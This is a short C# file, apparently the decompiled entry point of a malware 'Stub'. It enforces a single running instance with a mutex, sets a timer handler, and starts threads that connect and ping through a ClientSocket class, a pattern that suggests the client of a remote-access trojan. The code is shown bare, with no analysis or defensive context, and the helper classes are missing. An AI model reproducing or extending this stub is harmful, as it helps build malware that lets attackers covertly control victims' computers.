using System;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			ProjectData.EndApp();
		}
		Settings.dTimer2.Elapsed += Helper.tickees;
		Thread thread = new Thread(ClientSocket.BeginConnect);
		thread.Start();
		Thread thread2 = new Thread(ClientSocket.Ping);
		thread2.Start();
	}
}
